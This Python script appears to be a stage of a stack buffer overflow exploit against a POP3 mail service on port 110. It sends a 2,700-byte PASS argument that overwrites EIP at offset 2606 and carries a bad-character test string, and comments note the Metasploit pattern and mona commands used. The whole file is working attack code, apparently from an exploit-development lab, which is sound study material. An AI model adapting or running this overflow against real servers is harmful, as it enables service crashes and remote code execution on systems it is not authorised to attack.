#!/usr/bin/env python

import socket

# create socket --
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.0.166',110))

# bad chars --
# \x90 NOP / \x0A "\n "/ \x0D "\r ""
# ref -- 
# http://donsnotes.com/tech/charsets/ascii.html
badchar_test = ""
badchars = [0x00, 0x0A, 0x0D]
# generate sting --
for i in range(0x00, 0xFF+1): # range (0x00, 0xFF) only returns up to 0xFE
	if i not in badchars: # skip bad chars
		badchar_test += chr(i) # append each NON-BAD char into a string

# open file for writing
# !mona compare -a esp -f C:\Users\IEUser\Downloads\badchar_test.bin
with open("badchar_test.bin", "wb") as f:
	f.write(badchar_test)

# buffer --
# msf-pattern_offset -l 2700 -q 39694438
# [*] Exact match at offset 2606
b_totlen = 2700 # payload len
e_offset = 2606 # eip

# test offsets --
buf = ""
buf += "A"*(e_offset - len(buf))
buf += "B"*4
buf += badchar_test # esp 
buf += "D"*(b_totlen - len(buf))

# here we go --
s.send('USER dirtbag' + '\r\n')
data = s.recv(1024)

s.send('PASS ' + buf + '\r\n')
data = s.recv(1024)
s.close()

